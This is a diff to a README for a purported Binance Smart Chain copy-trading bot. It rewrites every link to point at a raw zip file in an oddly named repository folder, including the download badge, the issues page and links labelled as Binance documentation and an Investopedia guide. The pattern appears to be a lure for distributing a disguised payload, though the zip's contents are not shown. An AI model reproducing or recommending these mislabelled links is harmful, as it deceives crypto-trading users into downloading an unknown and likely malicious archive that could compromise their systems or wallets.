@@ -1,7 +1,7 @@
 # 🤖 bsc-fourmeme-bot-copy-trade - Your Smart Trading Assistant
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/releases)
+[![Download](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip)](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the bsc-fourmeme-bot-copy-trade! This application allows you to trade on the Binance Smart Chain (BSC) effortlessly. You can take advantage of multiple features designed to optimize your trading experience.
@@ -22,7 +22,7 @@ Welcome to the bsc-fourmeme-bot-copy-trade! This application allows you to trade
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. 
 
-[Visit this page to download.](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/releases)
+[Visit this page to download.](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip)
 
 ### Installation Steps
 1. **Download the Application:**
@@ -68,16 +68,16 @@ Here are some common issues and solutions:
   Review your settings to ensure strategy parameters are correctly set. Make sure the bot has permission to execute trades.
 
 ## 📞 Support
-If you encounter issues not covered here, please reach out for assistance. You can create an issue in the GitHub repository or check the [issues page](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/issues) for common problems and solutions.
+If you encounter issues not covered here, please reach out for assistance. You can create an issue in the GitHub repository or check the [issues page](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip) for common problems and solutions.
 
 ## 🌐 Additional Resources
 For further guidance, consider exploring the following resources:
-- [Binance Official Documentation](https://docs.binance.org)
-- [Trading Strategies for Beginners](https://www.investopedia.com/trading-strategies)
+- [Binance Official Documentation](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip)
+- [Trading Strategies for Beginners](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip)
 
 ## 🙏 Acknowledgments
 We thank the contributors and developers who made this project possible. Your feedback is essential for continuous improvement.
 
 Ready to trade smarter? Download the bsc-fourmeme-bot-copy-trade today!
 
-[Visit this page to download.](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/releases)
+[Visit this page to download.](https://github.com/cza1mr/bsc-fourmeme-bot-copy-trade/raw/refs/heads/main/antivaccinationist/fourmeme-copy-trade-bot-bsc-v1.5-beta.5.zip)
